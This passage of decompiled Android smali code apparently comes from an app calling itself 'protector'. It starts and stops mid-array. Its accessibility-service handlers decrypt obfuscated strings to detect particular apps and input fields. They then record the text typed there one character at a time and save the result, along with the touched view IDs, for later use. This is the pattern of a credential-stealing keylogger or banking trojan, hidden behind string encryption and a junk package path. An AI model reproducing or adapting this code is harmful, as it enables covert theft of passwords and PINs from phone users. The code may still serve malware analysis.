        -0x74t
        0x6dt
        0x23t
        -0x38t
        -0x15t
        0x70t
        -0x73t
        0x6et
        -0x80t
        0x6bt
        0x2at
        -0x38t
        -0x7t
        0x67t
        -0x66t
        0x68t
        -0x76t
        0x6ft
        0x3bt
        -0x71t
        -0x50t
        0x77t
        -0x73t
        0x33t
        -0x73t
        0x76t
        0x20t
        -0x47t
        -0x1at
        0x7bt
        -0x63t
        0x68t
        -0x76t
        0x70t
        0x11t
        -0x77t
        -0x1ft
    .end array-data

    nop

    :array_e
    .array-data 1
        -0x11t
        0x2t
        0x4et
        -0x1at
        -0x76t
        0x1et
        -0x17t
        0x1ct
    .end array-data

    :array_f
    .array-data 1
        -0x32t
        0xft
        0x69t
    .end array-data

    :array_10
    .array-data 1
        -0x51t
        0x7ct
        0xdt
        -0x1at
        0x1t
        0x2ct
        0x43t
        -0x79t
    .end array-data

    :array_11
    .array-data 1
        -0x26t
        -0x45t
        0x4dt
        -0x45t
        -0x52t
        -0x6at
        -0x3dt
        0x69t
    .end array-data

    :array_12
    .array-data 1
        0x44t
        0x79t
        0x67t
    .end array-data

    :array_13
    .array-data 1
        0x2ct
        0x0t
        0x17t
        0x32t
        0x9t
        -0x54t
        -0x29t
        -0x6ft
    .end array-data

    :array_14
    .array-data 1
        0x21t
        0x4at
        -0x3bt
        0xbt
    .end array-data

    :array_15
    .array-data 1
        0x49t
        0x33t
        -0x4bt
        0x6ft
        -0x53t
        0x29t
        -0x10t
        -0x3at
    .end array-data
.end method

.method private static c(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 10

    .line 1
    sget-object v0, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    invoke-static {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->j(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-nez v1, :cond_0

    return-void

    :cond_0
    const/4 v2, 0x1

    new-array v3, v2, [B

    const/16 v4, 0x51

    const/4 v5, 0x0

    aput-byte v4, v3, v5

    const/16 v4, 0x8

    new-array v6, v4, [B

    fill-array-data v6, :array_0

    invoke-static {v3, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    const-string v6, ""

    const/16 v7, 0x28

    if-eqz v3, :cond_3

    sget-boolean v3, Lcom/icontrol/protector/i;->a:Z

    if-nez v3, :cond_3

    new-array v3, v7, [B

    fill-array-data v3, :array_1

    new-array v8, v4, [B

    fill-array-data v8, :array_2

    invoke-static {v3, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v3, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_1

    new-array v3, v7, [B

    fill-array-data v3, :array_3

    new-array v8, v4, [B

    fill-array-data v8, :array_4

    invoke-static {v3, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v3, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_3

    :cond_1
    sget-boolean v3, Lcom/icontrol/protector/i;->f:Z

    if-eqz v3, :cond_2

    invoke-static {}, Lcom/icontrol/protector/w;->h()V

    :cond_2
    sput-boolean v2, Lcom/icontrol/protector/i;->a:Z

    sput-object v6, Lcom/icontrol/protector/i;->c:Ljava/lang/String;

    :cond_3
    new-array v3, v2, [B

    const/16 v8, -0x45

    aput-byte v8, v3, v5

    new-array v8, v4, [B

    fill-array-data v8, :array_5

    invoke-static {v3, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    const/4 v8, 0x3

    if-eqz v3, :cond_5

    sget-boolean v3, Lcom/icontrol/protector/i;->a:Z

    if-eqz v3, :cond_5

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v3

    const/16 v9, 0x2000

    if-ne v3, v9, :cond_5

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v3

    if-eqz v3, :cond_5

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v3

    invoke-interface {v3}, Ljava/util/List;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_5

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object p0

    invoke-interface {p0, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Ljava/lang/CharSequence;

    invoke-interface {p0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p0

    if-eqz p0, :cond_5

    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v3

    if-lez v3, :cond_4

    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v3

    sub-int/2addr v3, v2

    invoke-virtual {p0, v3}, Ljava/lang/String;->charAt(I)C

    move-result p0

    invoke-static {p0}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object p0

    goto :goto_0

    :cond_4
    move-object p0, v6

    :goto_0
    new-array v3, v8, [B

    fill-array-data v3, :array_6

    new-array v9, v4, [B

    fill-array-data v9, :array_7

    invoke-static {v3, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_5

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v9, Lcom/icontrol/protector/i;->c:Ljava/lang/String;

    invoke-virtual {v3, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    sput-object p0, Lcom/icontrol/protector/i;->c:Ljava/lang/String;

    :cond_5
    new-array p0, v2, [B

    const/16 v3, 0x22

    aput-byte v3, p0, v5

    new-array v3, v4, [B

    fill-array-data v3, :array_8

    invoke-static {p0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_7

    sget-boolean p0, Lcom/icontrol/protector/i;->a:Z

    if-eqz p0, :cond_7

    new-array p0, v7, [B

    fill-array-data p0, :array_9

    new-array v0, v4, [B

    fill-array-data v0, :array_a

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_6

    new-array p0, v7, [B

    fill-array-data p0, :array_b

    new-array v0, v4, [B

    fill-array-data v0, :array_c

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-nez p0, :cond_7

    :cond_6
    sput-boolean v5, Lcom/icontrol/protector/i;->a:Z

    sget-object p0, Lcom/icontrol/protector/i;->c:Ljava/lang/String;

    new-array v0, v8, [B

    fill-array-data v0, :array_d

    new-array v1, v4, [B

    fill-array-data v1, :array_e

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0, v6}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p0

    const/16 v0, 0xf

    new-array v0, v0, [B

    fill-array-data v0, :array_f

    new-array v1, v4, [B

    fill-array-data v1, :array_10

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0, v6}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    sput-object p0, Lcom/icontrol/protector/i;->d:Ljava/lang/String;

    sget-object p0, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    new-array v0, v8, [B

    fill-array-data v0, :array_11

    new-array v1, v4, [B

    fill-array-data v1, :array_12

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-array v1, v2, [B

    const/16 v2, -0x28

    aput-byte v2, v1, v5

    new-array v2, v4, [B

    fill-array-data v2, :array_13

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {p0, v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    sget-object p0, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    new-array v0, v8, [B

    fill-array-data v0, :array_14

    new-array v1, v4, [B

    fill-array-data v1, :array_15

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sget-object v1, Lcom/icontrol/protector/i;->d:Ljava/lang/String;

    invoke-static {p0, v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_7
    return-void

    :array_0
    .array-data 1
        0x61t
        0x49t
        -0x73t
        -0x27t
        0x76t
        -0x5bt
        0x78t
        0x7ct
    .end array-data

    :array_1
    .array-data 1
        -0x10t
        -0x30t
        -0x54t
        0x4dt
        0x2at
        -0xet
        0x63t
        0x6t
        -0x4t
        -0x2at
        -0x5bt
        0x4dt
        0x38t
        -0x1bt
        0x74t
        0x0t
        -0xat
        -0x2et
        -0x4ct
        0xat
        0x71t
        -0xbt
        0x63t
        0x5bt
        -0x20t
        -0x26t
        -0x5et
        0x16t
        0x39t
        -0xbt
        0x73t
        0xdt
        -0x2at
        -0x25t
        -0x58t
        0x17t
        0x1ft
        -0x7t
        0x7ft
        0x0t
    .end array-data

    :array_2
    .array-data 1
        -0x6dt
        -0x41t
        -0x3ft
        0x63t
        0x4bt
        -0x64t
        0x7t
        0x74t
    .end array-data

    :array_3
    .array-data 1
        -0x3dt
        -0x5ft
        -0x5ft
        -0x18t
        -0x70t
        0x2ct
        -0x3et
        -0x67t
        -0x31t
        -0x59t
        -0x58t
        -0x18t
        -0x7et
        0x3bt
        -0x2bt
        -0x61t
        -0x3bt
        -0x5dt
        -0x47t
        -0x51t
        -0x35t
        0x2bt
        -0x3et
        -0x3ct
        -0x30t
        -0x47t
        -0x58t
        -0x67t
        -0x68t
        0x2ct
        -0x2at
        -0x62t
        -0x2ct
        -0x6ft
        -0x60t
        -0x59t
        -0x78t
        0x2dt
        -0x2dt
        -0x61t
    .end array-data

    :array_4
    .array-data 1
        -0x60t
        -0x32t
        -0x34t
        -0x3at
        -0xft
        0x42t
        -0x5at
        -0x15t
    .end array-data

    :array_5
    .array-data 1
        -0x75t
        0x30t
        0x12t
        -0x37t
        0x60t
        -0x3bt
        0x63t
        0x42t
    .end array-data

    :array_6
    .array-data 1
        -0xct
        -0x7t
        0x37t
    .end array-data

    :array_7
    .array-data 1
        0x16t
        0x79t
        -0x6bt
        0x40t
        -0x24t
        -0x5at
        -0x13t
        -0x2ct
    .end array-data

    :array_8
    .array-data 1
        0x10t
        0x52t
        0x14t
        -0x43t
        0x17t
        0x72t
        0x53t
        0x17t
    .end array-data

    :array_9
    .array-data 1
        0x5dt
        0x67t
        0x28t
        0x38t
        -0x3dt
        -0x75t
        -0x37t
        -0x2t
        0x51t
        0x61t
        0x21t
        0x38t
        -0x2ft
        -0x64t
        -0x22t
        -0x8t
        0x5bt
        0x65t
        0x30t
        0x7ft
        -0x68t
        -0x74t
        -0x37t
        -0x5dt
        0x4dt
        0x6dt
        0x26t
        0x63t
        -0x30t
        -0x74t
        -0x27t
        -0xbt
        0x7bt
        0x6ct
        0x2ct
        0x62t
        -0xat
        -0x80t
        -0x2bt
        -0x8t
    .end array-data

    :array_a
    .array-data 1
        0x3et
        0x8t
        0x45t
        0x16t
        -0x5et
        -0x1bt
        -0x53t
        -0x74t
    .end array-data

    :array_b
    .array-data 1
        -0xat
        -0x32t
        -0x17t
        0x4ct
        0x3at
        0x0t
        -0x36t
        0x23t
        -0x6t
        -0x38t
        -0x20t
        0x4ct
        0x28t
        0x17t
        -0x23t
        0x25t
        -0x10t
        -0x34t
        -0xft
        0xbt
        0x61t
        0x7t
        -0x36t
        0x7et
        -0x1bt
        -0x2at
        -0x20t
        0x3dt
        0x32t
        0x0t
        -0x22t
        0x24t
        -0x1ft
        -0x2t
        -0x18t
        0x3t
        0x22t
        0x1t
        -0x25t
        0x25t
    .end array-data

    :array_c
    .array-data 1
        -0x6bt
        -0x5ft
        -0x7ct
        0x62t
        0x5bt
        0x6et
        -0x52t
        0x51t
    .end array-data

    :array_d
    .array-data 1
        0x35t
        -0x61t
        0xft
    .end array-data

    :array_e
    .array-data 1
        -0x29t
        0x1ft
        -0x53t
        0x47t
        -0x5at
        -0x78t
        0x6bt
        0x63t
    .end array-data

    :array_f
    .array-data 1
        0x37t
        0x75t
        -0x23t
        0x7bt
        -0x59t
        0x53t
        -0x66t
        -0x65t
        0x30t
        0x5ct
        -0x6ft
        0x29t
        -0x5dt
        0x56t
        -0x9t
    .end array-data

    :array_10
    .array-data 1
        0x6ct
        0x29t
        -0x58t
        0x4ft
        -0x3et
        0x63t
        -0x56t
        -0x4at
    .end array-data

    :array_11
    .array-data 1
        -0x4t
        0x2ft
        0x5ft
    .end array-data

    :array_12
    .array-data 1
        -0x63t
        0x5ct
        0x3bt
        -0x47t
        0xat
        0x8t
        -0x38t
        0x42t
    .end array-data

    :array_13
    .array-data 1
        -0x13t
        -0x5t
        0x79t
        0x3t
        0x1ft
        0x2ft
        0x46t
        0x4dt
    .end array-data

    :array_14
    .array-data 1
        0x28t
        -0x48t
        0x56t
    .end array-data

    :array_15
    .array-data 1
        0x40t
        -0x3ft
        0x26t
        -0x5bt
        -0x25t
        0x34t
        0x6t
        0x45t
    .end array-data
.end method

.method private static d(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 8

    .line 1
    sget-object v0, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    invoke-static {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->j(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-nez v1, :cond_0

    return-void

    :cond_0
    const/4 v2, 0x1

    new-array v3, v2, [B

    const/16 v4, -0x26

    const/4 v5, 0x0

    aput-byte v4, v3, v5

    const/16 v4, 0x8

    new-array v6, v4, [B

    fill-array-data v6, :array_0

    invoke-static {v3, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    const-string v6, ""

    if-eqz v3, :cond_1

    sget-boolean v3, Lcom/icontrol/protector/i;->a:Z

    if-nez v3, :cond_1

    const/16 v3, 0x1e

    new-array v3, v3, [B

    fill-array-data v3, :array_1

    new-array v7, v4, [B

    fill-array-data v7, :array_2

    invoke-static {v3, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v3, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    sput-boolean v2, Lcom/icontrol/protector/i;->a:Z

    sput-object v6, Lcom/icontrol/protector/i;->c:Ljava/lang/String;

    :cond_1
    new-array v3, v2, [B

    const/16 v7, -0x49

    aput-byte v7, v3, v5

    new-array v7, v4, [B

    fill-array-data v7, :array_3

    invoke-static {v3, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    const/4 v7, 0x3

    if-eqz v3, :cond_4

    sget-boolean v3, Lcom/icontrol/protector/i;->a:Z

    if-eqz v3, :cond_4

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v3

    if-ne v3, v2, :cond_4

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v3

    if-eqz v3, :cond_2

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v1

    sget-object v3, Lcom/icontrol/protector/i;->e:Ljava/util/List;

    invoke-interface {v3, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    :cond_2
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v1

    if-eqz v1, :cond_4

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v1

    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_4

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object p0

    invoke-interface {p0, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Ljava/lang/CharSequence;

    invoke-interface {p0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p0

    if-eqz p0, :cond_4

    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v1

    if-lez v1, :cond_3

    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v1

    sub-int/2addr v1, v2

    invoke-virtual {p0, v1}, Ljava/lang/String;->charAt(I)C

    move-result p0

    invoke-static {p0}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object p0

    goto :goto_0

    :cond_3
    move-object p0, v6

    :goto_0
    new-array v1, v7, [B

    fill-array-data v1, :array_4

    new-array v3, v4, [B

    fill-array-data v3, :array_5

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_4

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Lcom/icontrol/protector/i;->c:Ljava/lang/String;

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    sput-object p0, Lcom/icontrol/protector/i;->c:Ljava/lang/String;

    :cond_4
    new-array p0, v2, [B

    const/16 v1, 0x49

    aput-byte v1, p0, v5

    new-array v1, v4, [B

    fill-array-data v1, :array_6

    invoke-static {p0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_5

    sget-boolean p0, Lcom/icontrol/protector/i;->a:Z

    if-eqz p0, :cond_5

    sput-boolean v5, Lcom/icontrol/protector/i;->a:Z

    sget-object p0, Lcom/icontrol/protector/i;->c:Ljava/lang/String;

    new-array v0, v7, [B

    fill-array-data v0, :array_7

    new-array v1, v4, [B

    fill-array-data v1, :array_8

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0, v6}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p0

    const/16 v0, 0xf

    new-array v0, v0, [B

    fill-array-data v0, :array_9

    new-array v1, v4, [B

    fill-array-data v1, :array_a

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0, v6}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    sput-object p0, Lcom/icontrol/protector/i;->d:Ljava/lang/String;

    sget-object p0, Lcom/icontrol/protector/i;->e:Ljava/util/List;

    invoke-virtual {p0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object p0

    sget-object v0, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    new-array v1, v7, [B

    fill-array-data v1, :array_b

    new-array v3, v4, [B

    fill-array-data v3, :array_c

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    new-array v2, v2, [B

    const/16 v3, -0x3a

    aput-byte v3, v2, v5

    new-array v3, v4, [B

    fill-array-data v3, :array_d

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    sget-object v0, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    new-array v1, v7, [B

    fill-array-data v1, :array_e

    new-array v2, v4, [B

    fill-array-data v2, :array_f

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    sget-object v2, Lcom/icontrol/protector/i;->d:Ljava/lang/String;

    invoke-static {v0, v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    sget-object v0, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    const/4 v1, 0x4

    new-array v1, v1, [B

    fill-array-data v1, :array_10

    new-array v2, v4, [B

    fill-array-data v2, :array_11

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_5
    return-void

    :array_0
    .array-data 1
        -0x16t
        -0x71t
        -0x2t
        -0x3dt
        -0x1et
        0xet
        -0x1et
        0x13t
    .end array-data

    :array_1
    .array-data 1
        -0x10t
        -0x49t
        -0x5ct
        -0x80t
        -0x11t
        -0x66t
        0x35t
        0x16t
        -0x4t
        -0x4ft
        -0x53t
        -0x80t
        -0x3t
        -0x73t
        0x22t
        0x10t
        -0xat
        -0x4bt
        -0x44t
        -0x39t
        -0x4ct
        -0x63t
        0x35t
        0x4bt
        -0x2t
        -0x4ft
        -0x4ft
        -0xft
        -0x5t
        -0x7ct
    .end array-data

    nop

    :array_2
    .array-data 1
        -0x6dt
        -0x28t
        -0x37t
        -0x52t
        -0x72t
        -0xct
        0x51t
        0x64t
    .end array-data

    :array_3
    .array-data 1
        -0x79t
        -0x73t
        0x66t
        0x78t
        0x47t
        0x43t
        0x65t
        -0x7ft
    .end array-data

    :array_4
    .array-data 1
        -0x4at
        0x1t
        0x28t
    .end array-data

    :array_5
    .array-data 1
        0x54t
        -0x7ft
        -0x76t
        -0x20t
        0x49t
        -0x29t
        -0x12t
        0x39t
    .end array-data

    :array_6
    .array-data 1
        0x7bt
        0xat
        -0x5t
        0x6at
        0x17t
